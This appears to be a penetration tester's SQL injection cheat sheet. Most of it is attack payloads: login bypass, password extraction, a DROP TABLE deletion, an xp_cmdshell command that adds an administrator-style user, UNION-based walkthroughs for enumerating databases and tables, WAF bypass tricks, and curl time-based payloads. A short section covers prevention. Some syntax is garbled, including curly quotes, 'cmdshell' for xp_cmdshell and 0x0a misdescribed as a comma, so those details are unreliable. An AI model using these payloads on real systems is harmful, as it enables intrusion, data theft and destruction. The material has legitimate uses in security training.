#### Malicious query example

##### Login bypass input example


WORDLIST : /usr/share/seclists/Fuzzing/Databases/sqli.auth.bypass.txt

```
$query = "SELECT first_name, last_name FROM users WHERE user_id= '$id‘ AND password = ‘$pass’;";

$id = ' or 1<2 -- -
	
$query = "SELECT first_name, last_nameFROM users WHERE user_id= ‘’ or 1<2 ---‘ AND password = ‘$pass’;";
```

##### Data collection input example

```
$query = "SELECT first_name, last_name FROM users WHERE user_id= '$id‘ AND password = ‘$pass’;";

$id = 1’ and SELECT password FROM users -- -

$query = "SELECT first_name, last_name FROM users WHERE user_id = ‘1’ and SELECT password FROM users -- -‘ AND password = ‘$pass’;";
```

##### Delete data input example

```
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id‘ AND password = ‘$pass’;";

$pass = ‘; DROP TABLE users -- -

$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id‘ AND password = ‘’; DROP TABLE users -- -’;";
```

##### Remote code execution input example

The SQL server context needs to run as “sa”

```
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id‘ AND password = ‘$pass’;";

$pass = ‘; exec cmdshell ‘net user pentester pentesterpassword /ADD’ -- -

$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id‘ AND password = ‘‘; exec cmdshell 'net user pentester pentesterpassword /ADD’ -- -’;";
```

#### Detection

Test with quote and double quote

- Legitimate request : http://www.example.com/gallery.php?id=6
- Illegitimate request : http://www.example.com/gallery.php?id=6′

▪ Syntax error

#### Verification

- Confirm with delay :

```
mysql : SLEEP(5)
mssql : WAITFOR DELAY '0:0:5'
```

##### Error based

The error output helps a lot for understanding the consequences linked to injections

##### Time based

This kind of attack injects a SQL segment which contains specific DBMS function such as SLEEP for MYSQL.

Depending on the time it takes to get the server response, it is possible to deduct some information.

##### Blind SQLi

No error returned by the application.

Ask the database true or false questions and determine the answer based on the application responses.

#### Exploitation

##### 1. Determine the number of columns

- http://www.example.com/gallery.php?id=6 order by 1
- http://www.example.com/gallery.php?id=6 order by 6

- The request returns an error when N=6
- Stop when you get an error the number of columns will be N-1
- 5 columns for this example

##### 2. Print the current page connected columns

http://www.example.com/gallery.php?id=6 union all select 1,2,3,4,5

- Make sure the number of columns is the same for both selects
- Be carreful to data type ! (null, 'a', 1 ...)

##### 3. Get database and its version

- http://www.example.com/gallery.php?id=6 union all select 1,database(),3,4,5
- http://www.example.com/gallery.php?id=6 union all select 1,version(),3,4,5

- Syntax is different depending on the database
	- MSSQL Server
	- MySQL
	- Oracle
	- ...

##### 4. Get database names

http://www.example.com/gallery.php?id=6 union all select 1,group_concat(schema_name),3,4,N-1 from Information_schema.schemata-- -

##### 5. Get table names

http://www.example.com/gallery.php?id=6 union all select 1,group_concat(table_name),3,4,N-1 from Information_schema.tables where table_schema=database()-- -

##### 6. Retrieve column names

http://www.example.com/gallery.php?id=6 union all select 1,group_concat(column_name),3,4,N-1 from Information_schema.columns where table_name=mysqlchar-- -

##### Gather the data

http://www.example.com/gallery.php?id=6 union all select 1,group_concat(column_name,0x0a),3,4,N-1 from table_name
 - 0x0a is the hex value of comas. It will separate the table data into columns

#### Tools

- SQLMap : https://github.com/sqlmapproject/sqlmap

#### Prevention

- Never build SQL commands manually
- Escape & Encode
	- Special characters
	- Single quote and double quote
- Use parameterized / prepared SQL statements
	- It forces the user input to be considered as the content of a parameter
	- It is not considered as a part of a SQL command
- Limit data and privileges that a database has access to (least privilege)

#### Bypass

- SQL comments and case changing
	- `Sel/**/EcT`
- URL encoding
	- `/*!se%6cect*/`
	- `/*!se%6cect*/`
- Replaced Keywords
	- `SEselectLECT`
- https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF


----------------------

#### MSSQL without SQLmap

TODO...

#### Time Based

1. Detect the SQLi 
2. Confirm with delay
3. Simple POST request 

```
curl --data "username=pentest&pass=pentest&submit=Submit" http://$IP/
```
4. Simple POST request with delay

```
curl --data "username=pentest&pass=pentest';  WAITFOR DELAY '0:0:5';--&submit=Submit" http://$IP/
```
